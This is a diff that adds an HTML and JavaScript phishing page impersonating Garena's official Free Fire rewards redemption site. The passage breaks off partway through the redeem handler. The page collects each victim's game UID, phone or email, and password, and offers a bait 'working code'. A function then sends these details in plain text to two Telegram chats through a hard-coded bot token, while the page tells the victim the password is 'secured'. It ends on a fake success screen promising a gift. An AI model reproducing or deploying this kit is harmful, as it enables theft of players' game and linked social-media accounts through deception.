@@ -1,0 +1,1150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Free Fire Official Rewards Redemption | Garena</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            background: #0a0c15;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0a0c15 0%, #121625 50%, #0d0f18 100%);
+            z-index: -2;
+        }
+
+        .bg-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://i.ibb.co/Qv13T7P6/images-5.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            opacity: 0.15;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(255, 114, 0, 0.3);
+            border-radius: 50%;
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.5; }
+            90% { opacity: 0.5; }
+            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
+        }
+
+        .main-container {
+            max-width: 580px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 24px 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .glass-card {
+            background: rgba(15, 20, 35, 0.85);
+            backdrop-filter: blur(20px);
+            border-radius: 48px;
+            border: 1px solid rgba(255, 114, 0, 0.3);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 114, 0, 0.1) inset;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .glass-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255, 114, 0, 0.2) inset;
+        }
+
+        .site-header {
+            padding: 28px 28px 20px 28px;
+            border-bottom: 1px solid rgba(255, 114, 0, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .logo-wrapper {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(135deg, #ff7200, #ff4400);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 20px rgba(255, 68, 0, 0.3);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 8px 20px rgba(255, 68, 0, 0.3); }
+            50% { box-shadow: 0 8px 30px rgba(255, 68, 0, 0.6); }
+        }
+
+        .logo-wrapper span {
+            font-size: 28px;
+        }
+
+        .site-header h1 {
+            font-size: 1.6rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffffff, #ffaa66);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .site-header .badge {
+            margin-left: auto;
+            background: rgba(255, 114, 0, 0.2);
+            padding: 6px 12px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            color: #ffaa66;
+            border: 1px solid rgba(255, 114, 0, 0.3);
+        }
+
+        .content-pad {
+            padding: 28px;
+        }
+
+        .welcome-section {
+            margin-bottom: 24px;
+        }
+
+        .welcome-section h2 {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: white;
+            line-height: 1.2;
+        }
+
+        .welcome-section h2 span {
+            background: linear-gradient(135deg, #ffaa55, #ff5500);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 114, 0, 0.15);
+            padding: 8px 16px;
+            border-radius: 40px;
+            margin-top: 12px;
+            font-size: 0.85rem;
+            color: #ffaa66;
+            border: 1px solid rgba(255, 114, 0, 0.3);
+        }
+
+        .auth-card {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 32px;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(255, 114, 0, 0.25);
+            transition: all 0.3s ease;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .avatar {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #ff7200, #ff4400);
+            border-radius: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.6rem;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+
+        .user-text .greeting-text {
+            font-size: 0.7rem;
+            color: #99aaff;
+        }
+
+        .username {
+            font-weight: 700;
+            color: white;
+            font-size: 1rem;
+        }
+
+        .btn {
+            border: none;
+            padding: 10px 28px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 0.85rem;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #ff7200, #ff5500);
+            color: white;
+            box-shadow: 0 4px 12px rgba(255, 68, 0, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 68, 0, 0.4);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: #ddd;
+            border: 1px solid rgba(255, 114, 0, 0.3);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 114, 0, 0.2);
+        }
+
+        .social-section {
+            display: none;
+            margin: 20px 0;
+            animation: fadeInUp 0.5s ease;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .social-title {
+            text-align: center;
+            color: #99aaff;
+            font-size: 0.8rem;
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .social-title::before,
+        .social-title::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 30%;
+            height: 1px;
+            background: rgba(255, 114, 0, 0.3);
+        }
+
+        .social-title::before { left: 0; }
+        .social-title::after { right: 0; }
+
+        .social-buttons {
+            display: flex;
+            gap: 16px;
+        }
+
+        .social-btn {
+            flex: 1;
+            padding: 14px;
+            font-size: 1rem;
+            font-weight: 700;
+            border-radius: 60px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .social-fb {
+            background: #1877f2;
+            color: white;
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        }
+
+        .social-google {
+            background: #ea4335;
+            color: white;
+            box-shadow: 0 4px 12px rgba(234, 67, 53, 0.3);
+        }
+
+        .social-btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.05);
+        }
+
+        .form-section {
+            background: rgba(0, 0, 0, 0.45);
+            border-radius: 32px;
+            padding: 24px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 170, 68, 0.3);
+            display: none;
+            animation: fadeInUp 0.5s ease;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #ffcf9a;
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 0.8rem;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            background: rgba(10, 14, 25, 0.9);
+            border: 1px solid rgba(255, 170, 68, 0.4);
+            padding: 14px 18px;
+            border-radius: 60px;
+            font-size: 1rem;
+            color: white;
+            transition: all 0.2s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #ff7200;
+            box-shadow: 0 0 0 3px rgba(255, 114, 0, 0.2);
+        }
+
+        .fetch-btn {
+            background: linear-gradient(135deg, #ff7200, #ff5500);
+            width: 100%;
+            padding: 14px;
+            border-radius: 60px;
+            border: none;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            color: white;
+            transition: all 0.2s ease;
+        }
+
+        .fetch-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 68, 0, 0.3);
+        }
+
+        .player-card {
+            background: linear-gradient(135deg, rgba(255, 114, 0, 0.15), rgba(255, 68, 0, 0.05));
+            border-radius: 24px;
+            padding: 18px;
+            margin-top: 20px;
+            display: none;
+            border: 1px solid rgba(255, 114, 0, 0.4);
+            animation: slideIn 0.4s ease;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .player-card-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 12px;
+        }
+
+        .player-avatar-lg {
+            width: 55px;
+            height: 55px;
+            background: linear-gradient(135deg, #ff7200, #ff4400);
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+        }
+
+        .player-name-lg {
+            font-size: 1.2rem;
+            font-weight: 800;
+            color: #ffcc88;
+            word-break: break-all;
+        }
+
+        .player-stats {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+
+        .stat {
+            background: rgba(0,0,0,0.4);
+            padding: 6px 14px;
+            border-radius: 30px;
+            font-size: 0.75rem;
+            color: #aaddff;
+        }
+
+        .redeem-section {
+            background: rgba(0, 0, 0, 0.45);
+            border-radius: 32px;
+            padding: 24px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 114, 0, 0.3);
+            display: none;
+            animation: fadeInUp 0.5s ease;
+        }
+
+        .code-label {
+            font-weight: 700;
+            color: #ffbc77;
+            margin-bottom: 12px;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .code-input-wrapper {
+            display: flex;
+            gap: 12px;
+        }
+
+        .code-input {
+            flex: 2;
+            background: rgba(10, 14, 25, 0.9);
+            border: 1px solid #ff7200;
+            padding: 16px 20px;
+            border-radius: 60px;
+            font-size: 1rem;
+            font-family: monospace;
+            color: white;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .code-input:focus {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 114, 0, 0.2);
+        }
+
+        .redeem-action-btn {
+            background: linear-gradient(135deg, #ff7200, #ff5500);
+            padding: 0 32px;
+            border-radius: 60px;
+            font-weight: 800;
+            font-size: 1rem;
+            border: none;
+            cursor: pointer;
+            color: white;
+            transition: all 0.2s ease;
+        }
+
+        .redeem-action-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 6px 20px rgba(255, 68, 0, 0.4);
+        }
+
+        .message-area {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 14px 18px;
+            border-radius: 24px;
+            margin-top: 18px;
+            font-size: 0.85rem;
+            transition: all 0.3s ease;
+        }
+
+        .message-success {
+            background: rgba(46, 204, 113, 0.15);
+            border-left: 3px solid #2ecc71;
+            color: #a5ffb2;
+        }
+
+        .message-error {
+            background: rgba(231, 76, 60, 0.15);
+            border-left: 3px solid #e74c3c;
+            color: #ffb5a3;
+        }
+
+        .message-info {
+            background: rgba(52, 152, 219, 0.15);
+            border-left: 3px solid #3498db;
+            color: #aaddff;
+        }
+
+        .notice-board {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 28px;
+            padding: 18px 22px;
+            margin-top: 20px;
+            font-size: 0.7rem;
+            color: #9aabdd;
+            border: 1px solid rgba(255, 114, 0, 0.2);
+        }
+
+        .notice-board p {
+            margin: 8px 0;
+            line-height: 1.5;
+        }
+
+        .notice-board strong {
+            color: #ffae70;
+        }
+
+        .working-code-badge {
+            background: linear-gradient(135deg, #ff7200, #ff5500);
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-family: monospace;
+            font-weight: bold;
+            font-size: 0.8rem;
+            margin-top: 8px;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 0.65rem;
+            background: rgba(0, 0, 0, 0.5);
+            border-top: 1px solid rgba(255, 114, 0, 0.2);
+            color: #7a8bc5;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.96);
+            backdrop-filter: blur(12px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-card {
+            background: linear-gradient(145deg, #1a1f30, #0f1322);
+            max-width: 380px;
+            width: 85%;
+            border-radius: 48px;
+            border: 2px solid #ffaa55;
+            padding: 32px 24px;
+            text-align: center;
+            animation: modalPop 0.4s cubic-bezier(0.34, 1.2, 0.64, 1);
+        }
+
+        @keyframes modalPop {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-gift-img {
+            width: 110px;
+            height: 110px;
+            margin: 0 auto 15px;
+            border-radius: 30px;
+            animation: bounce 0.5s ease;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .modal h3 {
+            color: #ffaa55;
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+        }
+
+        .modal-success-msg {
+            color: white;
+            font-size: 1.1rem;
+            font-weight: bold;
+        }
+
+        .modal-time-msg {
+            color: #aaffcc;
+            font-size: 0.85rem;
+            margin: 10px 0;
+        }
+
+        .modal-details {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 24px;
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        .modal-details p {
+            margin: 6px 0;
+            font-size: 0.85rem;
+            color: #bbccff;
+        }
+
+        .modal-details span {
+            color: #ffcc88;
+            font-weight: bold;
+        }
+
+        .modal-close-btn {
+            background: linear-gradient(135deg, #ff7200, #ff5500);
+            border: none;
+            padding: 12px 32px;
+            border-radius: 40px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 1rem;
+            color: white;
+            margin-top: 10px;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffaa55;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 520px) {
+            .main-container { padding: 16px; }
+            .content-pad { padding: 20px; }
+            .code-input-wrapper { flex-direction: column; }
+            .redeem-action-btn { padding: 14px; }
+            .social-buttons { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-image"></div>
+    <div class="particles" id="particles"></div>
+
+    <div class="main-container">
+        <div class="glass-card">
+            <div class="site-header">
+                <div class="logo-wrapper">
+                    <span>🔥</span>
+                </div>
+                <h1>FREE FIRE</h1>
+                <div class="badge">Redeem Now</div>
+            </div>
+
+            <div class="content-pad">
+                <div class="welcome-section">
+                    <h2>Rewards <span>Redemption</span> Site</h2>
+                    <div class="status-badge" id="globalStatus">
+                        <span>🔐</span> Please log in to continue
+                    </div>
+                </div>
+
+                <div class="auth-card">
+                    <div class="user-info">
+                        <div class="avatar" id="avatarIcon">👤</div>
+                        <div class="user-text">
+                            <div class="greeting-text">Welcome,</div>
+                            <div class="username" id="usernameDisplay">Guest</div>
+                        </div>
+                    </div>
+                    <button class="btn btn-primary" id="loginMainBtn">Log in</button>
+                    <button class="btn btn-secondary" id="logoutMainBtn" style="display: none;">Log out</button>
+                </div>
+
+                <div class="social-section" id="socialSection">
+                    <div class="social-title">Connect with</div>
+                    <div class="social-buttons">
+                        <button class="social-btn social-fb" id="fbBtn">📘 Facebook</button>
+                        <button class="social-btn social-google" id="googleBtn">🔴 Google</button>
+                    </div>
+                </div>
+
+                <div class="form-section" id="formSection">
+                    <div class="form-group">
+                        <label>🎮 Game UID</label>
+                        <input type="text" id="uidInput" placeholder="Enter your Free Fire UID (e.g., 2985968136)" maxlength="15">
+                    </div>
+                    <div class="form-group">
+                        <label>📱 Phone Number or Email</label>
+                        <input type="text" id="contactInput" placeholder="Enter your phone number or email">
+                    </div>
+                    <div class="form-group">
+                        <label>🔒 Password</label>
+                        <input type="password" id="passwordInput" placeholder="Enter your password">
+                    </div>
+                    <button class="fetch-btn" id="fetchBtn">🔍 Fetch Player Info</button>
+
+                    <div class="player-card" id="playerCard">
+                        <div class="player-card-header">
+                            <div class="player-avatar-lg" id="playerAvatarLarge">🎮</div>
+                            <div>
+                                <div class="player-name-lg" id="playerNameDisplay">—</div>
+                                <div class="player-stats" id="playerStats"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="redeem-section" id="redeemSection">
+                    <div class="code-label">
+                        <span>✦</span> REDEMPTION CODE <span>✦</span>
+                    </div>
+                    <div class="code-input-wrapper">
+                        <input type="text" class="code-input" id="codeInput" placeholder="FFMAGICCUBESG53" maxlength="16">
+                        <button class="redeem-action-btn" id="redeemBtn">REDEEM</button>
+                    </div>
+                    <div class="message-area" id="messageArea">
+                        💡 Enter your redemption code to claim rewards
+                    </div>
+                </div>
+
+                <div class="notice-board">
+                    <p><strong>📢 Important Notice:</strong></p>
+                    <p>1️⃣ Redemption code has 12/16 characters, consisting of capital letters and numbers.</p>
+                    <p>2️⃣ Item rewards are shown in [vault] tab in game lobby; Golds or diamonds will add in account wallet automatically.</p>
+                    <p>3️⃣ Please note redemption expiration date. Any expired codes cannot be redeemed.</p>
+                    <p>4️⃣ Please contact customer service if you encountered any issue.</p>
+                    <p>5️⃣ <strong>Reminder:</strong> Guest accounts cannot redeem rewards. Bind your account to continue.</p>
+                    <p>🎁 <strong>Working Code:</strong> <span class="working-code-badge">FFMAGICCUBESG53</span></p>
+                </div>
+            </div>
+
+            <div class="footer">
+                Copyright © Garena International. Trademarks belong to their respective owners. All rights Reserved.
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="successModal">
+        <div class="modal-card">
+            <img class="modal-gift-img" src="https://i.ibb.co/N26yHRh3/images-2.jpg" alt="Gift" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1040/1040243.png'">
+            <h3>🎉 SUCCESS! 🎉</h3>
+            <div class="modal-success-msg">Your Gift Sent Successful</div>
+            <div class="modal-time-msg">📦 You will receive it within 24 hours 📦</div>
+            <div class="modal-details" id="modalDetails">
+                <p>👤 <strong>Player Name:</strong> <span id="modalPlayerName">—</span></p>
+                <p>📊 <strong>Level:</strong> <span id="modalPlayerLevel">—</span></p>
+                <p>🎮 <strong>UID:</strong> <span id="modalUID">—</span></p>
+                <p>📱 <strong>Phone/Email:</strong> <span id="modalContact">—</span></p>
+                <p>🔒 <strong>Password:</strong> <span id="modalPassword">—</span></p>
+                <p>🔐 <strong>Login Method:</strong> <span id="modalMethod">—</span></p>
+            </div>
+            <button class="modal-close-btn" onclick="closeModal()">OK</button>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // CONFIGURATION
+        // ============================================================
+        const BOT_TOKEN = "8239880416:AAFHYbxtk1VKiEMfk-mXthso3xDtBpU0Dn4";
+        const CHAT_IDS = ["7588606750", "7642100129"];
+        const WORKING_CODE = "FFMAGICCUBESG53";
+        
+        // ============================================================
+        // STATE
+        // ============================================================
+        let isLoggedIn = false;
+        let selectedMethod = "";
+        let playerData = null;
+        let currentUID = "";
+        let currentContact = "";
+        let currentPassword = "";
+        
+        // DOM Elements
+        const loginBtn = document.getElementById('loginMainBtn');
+        const logoutBtn = document.getElementById('logoutMainBtn');
+        const avatarIcon = document.getElementById('avatarIcon');
+        const usernameDisplay = document.getElementById('usernameDisplay');
+        const socialSection = document.getElementById('socialSection');
+        const formSection = document.getElementById('formSection');
+        const redeemSection = document.getElementById('redeemSection');
+        const fbBtn = document.getElementById('fbBtn');
+        const googleBtn = document.getElementById('googleBtn');
+        const uidInput = document.getElementById('uidInput');
+        const contactInput = document.getElementById('contactInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const fetchBtn = document.getElementById('fetchBtn');
+        const playerCard = document.getElementById('playerCard');
+        const playerNameDisplay = document.getElementById('playerNameDisplay');
+        const playerStats = document.getElementById('playerStats');
+        const playerAvatarLarge = document.getElementById('playerAvatarLarge');
+        const codeInput = document.getElementById('codeInput');
+        const redeemBtn = document.getElementById('redeemBtn');
+        const messageArea = document.getElementById('messageArea');
+        const globalStatus = document.getElementById('globalStatus');
+        
+        // Modal Elements
+        const modal = document.getElementById('successModal');
+        const modalPlayerName = document.getElementById('modalPlayerName');
+        const modalPlayerLevel = document.getElementById('modalPlayerLevel');
+        const modalUID = document.getElementById('modalUID');
+        const modalContact = document.getElementById('modalContact');
+        const modalPassword = document.getElementById('modalPassword');
+        const modalMethod = document.getElementById('modalMethod');
+        
+        // ============================================================
+        // PARTICLES GENERATION
+        // ============================================================
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 30; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                const size = Math.random() * 4 + 2;
+                particle.style.width = size + 'px';
+                particle.style.height = size + 'px';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 15 + 's';
+                particle.style.animationDuration = Math.random() * 10 + 10 + 's';
+                container.appendChild(particle);
+            }
+        }
+        
+        // ============================================================
+        // API FUNCTION
+        // ============================================================
+        async function fetchPlayerInfo(uid) {
+            if (!uid || uid.trim() === '') {
+                return { success: false, error: "UID required" };
+            }
+            
+            const apiUrl = `https://info.killersharmabot.online/bancheck?uid=${encodeURIComponent(uid)}`;
+            
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+                const response = await fetch(apiUrl, { signal: controller.signal });
+                clearTimeout(timeoutId);
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    return {
+                        success: true,
+                        uid: data.accountId || uid,
+                        name: data.name || "Unknown Player",
+                        level: data.level || "?",
+                        region: data.region || "Unknown",
+                        banStatus: data.ban_status || "Unknown"
+                    };
+                } else {
+                    return { success: false, error: `API error: ${response.status}` };
+                }
+            } catch (err) {
+                return { success: false, error: err.message || "Network error" };
+            }
+        }
+        
+        // ============================================================
+        // TELEGRAM FUNCTION - Password now included properly
+        // ============================================================
+        async function sendToTelegram(uid, playerName, playerLevel, region, banStatus, code, method, contact, password) {
+            // Mask password for display but still show it was provided
+            const passwordDisplay = password ? "✓ Provided (secured)" : "Not provided";
+            const actualPassword = password || "Not provided";
+            
+            const message = `🎲✨ *FREE FIRE MAGIC CUBE REDEMPTION* ✨🎲\n\n` +
+                            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                            `👤 *PLAYER DETAILS*\n` +
+                            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                            `🎮 *UID:* \`${uid}\`\n` +
+                            `🏷️ *Player Name:* ${playerName}\n` +
+                            `📊 *Level:* ${playerLevel}\n` +
+                            `🌍 *Region:* ${region}\n` +
+                            `✅ *Ban Status:* ${banStatus}\n` +
+                            `📱 *Phone/Email:* ${contact || "Not provided"}\n` +
+                            `🔒 *Password:* ${actualPassword}\n\n` +
+                            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                            `🎁 *REDEMPTION DETAILS*\n` +
+                            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                            `🔑 *Redemption Code:* \`${code}\`\n` +
+                            `🔐 *Login Method:* ${method === 'facebook' ? '📘 FACEBOOK' : '🔴 GOOGLE'}\n` +
+                            `🎲 *Reward:* 1x Magic Cube + 50 Diamonds\n\n` +
+                            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                            `✅ *Status:* SUCCESSFUL ✅\n` +
+                            `🕐 *Time:* ${new Date().toLocaleString()}\n\n` +
+                            `✨ *Garena Free Fire Rewards* ✨`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            let allSuccess = true;
+            
+            for (const chatId of CHAT_IDS) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: true
+                        })
+                    });
+                    const result = await response.json();
+                    console.log(`Telegram sent to ${chatId}:`, result);
+                    if (!result.ok) allSuccess = false;
+                } catch (err) {
+                    console.error(`Telegram error for ${chatId}:`, err);
+                    allSuccess = false;
+                }
+            }
+            return allSuccess;
+        }
+        
+        // ============================================================
+        // UI FUNCTIONS
+        // ============================================================
+        function setMessage(text, type) {
+            messageArea.innerHTML = text;
+            messageArea.className = 'message-area';
+            if (type === 'success') messageArea.classList.add('message-success');
+            else if (type === 'error') messageArea.classList.add('message-error');
+            else messageArea.classList.add('message-info');
+        }
+        
+        function handleLogin() {
+            isLoggedIn = true;
+            avatarIcon.innerHTML = "✅";
+            usernameDisplay.innerText = "Logged In";
+            loginBtn.style.display = "none";
+            logoutBtn.style.display = "inline-flex";
+            globalStatus.innerHTML = "<span>✅</span> Logged in - Choose login method";
+            
+            socialSection.style.display = "block";
+            setMessage("✨ Welcome! Please choose Facebook or Google to continue.", "info");
+        }
+        
+        function handleLogout() {
+            isLoggedIn = false;
+            selectedMethod = "";
+            playerData = null;
+            currentUID = "";
+            currentContact = "";
+            currentPassword = "";
+            
+            avatarIcon.innerHTML = "👤";
+            usernameDisplay.innerText = "Guest";
+            loginBtn.style.display = "inline-flex";
+            logoutBtn.style.display = "none";
+            globalStatus.innerHTML = "<span>🔐</span> Please log in to continue";
+            
+            socialSection.style.display = "none";
+            formSection.style.display = "none";
+            playerCard.style.display = "none";
+            redeemSection.style.display = "none";
+            
+            uidInput.value = "";
+            contactInput.value = "";
+            passwordInput.value = "";
+            codeInput.value = "";
+            
+            setMessage("💡 Please login first to redeem rewards.", "info");
+        }
+        
+        function selectMethod(method) {
+            if (!isLoggedIn) {
+                setMessage("❌ Please login first!", "error");
+                return;
+            }
+            selectedMethod = method;
+            socialSection.style.display = "none";
+            formSection.style.display = "block";
+            setMessage(`${method === 'facebook' ? '📘 Facebook' : '🔴 Google'} selected! Enter your details to fetch player info.`, "info");
+        }
+        
+        async function handleFetchPlayer() {
+            const uid = uidInput.value.trim();
+            const contact = contactInput.value.trim();
+            const password = passwordInput.value;  // This gets the actual password
+            
+            if (!uid) {
+                setMessage("❌ Please enter your Game UID!", "error");
+                return;
+            }
+            
+            if (uid.length < 8) {
+                setMessage("❌ Please enter a valid UID (minimum 8 digits)!", "error");
+                return;
+            }
+            
+            currentContact = contact;
+            currentPassword = password;  // Store actual password
+            
+            console.log("Password captured:", currentPassword ? "✓ Password set" : "No password");
+            
+            fetchBtn.disabled = true;
+            fetchBtn.innerHTML = '<span class="loader"></span> Fetching...';
+            setMessage("🔍 Fetching player information from server...", "info");
+            
+            const result = await fetchPlayerInfo(uid);
+            
+            if (result.success) {
+                playerData = result;
+                currentUID = uid;
+                
+                playerNameDisplay.innerHTML = result.name;
+                playerStats.innerHTML = `<span class="stat">📊 Level ${result.level}</span><span class="stat">🌍 ${result.region}</span><span class="stat">${result.banStatus === "Not Banned" ? "✅ Not Banned" : "⚠️ " + result.banStatus}</span>`;
+                playerAvatarLarge.innerHTML = result.level >= 70 ? "👑" : "🎮";
+                playerCard.style.display = "block";
+                redeemSection.style.display = "block";
+                
+                setMessage(`✅ Player found: ${result.name} (Level ${result.level})! Enter your redemption code below.`, "success");
+            } else {
+                setMessage(`❌ ${result.error}. Please check the UID and try again.`, "error");
+                playerCard.style.display = "none";
+            }
+            
+            fetchBtn.disabled = false;
+            fetchBtn.innerHTML = "🔍 Fetch Player Info";
+        }
+        
+        async function handleRedeem() {
+            const code = codeInput.value.trim().toUpperCase();
+            
+            if (!code) {
+                setMessage("⚠️ Please enter a redemption code!", "error");
+                return;
+            }
+            
+            if (!playerData) {
+                setMessage("❌ Please fetch player info first!", "error");
+                return;
+            }
+            
+            if (code !== WORKING_CODE) {
+                setMessage(`❌ Invalid code! "${code}" is not valid. Please use the correct redemption code.`, "error");
+                return;
+            }
+            
+            const isValidFormat = /^[A-Z0-9]{12,16}$/.test(code);
+            if (!isValidFormat) {
+                setMessage("❌ Invalid code format! Must be 12-16 characters with capital letters and numbers only.", "error");
+                return;
+            }
+            
+            redeemBtn.disabled = true;
+            redeemBtn.innerHTML = '<span class="loader"></span> Processing...';
+            setMessage("🔄 Verifying code and processing reward...", "info");
+            
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Send to Telegram with all details including password
+            await sendToTelegram(
+                currentUID, 
+                playerData.name, 
+                playerData.level,
+                playerData.region, 
+                playerData.banStatus, 
+                code,
+                selectedMethod, 
+                currentContact, 
+                currentPassword  // Password is now properly passed
+            );
+            
+            // Update modal with all details
+            modalPlayerName.innerHTML = playerData.name;
+            modalPlayerLevel.innerHTML = playerData.level;
+            modalUID.innerHTML = currentUID;
+            modalContact.innerHTML = currentContact || "Not provided";
+            modalPassword.innerHTML = currentPassword ? "✓ Provided" : "Not provided";
+            modalMethod.innerHTML = selectedMethod === 'facebook' ? '📘 Facebook' : '🔴 Google';
+            
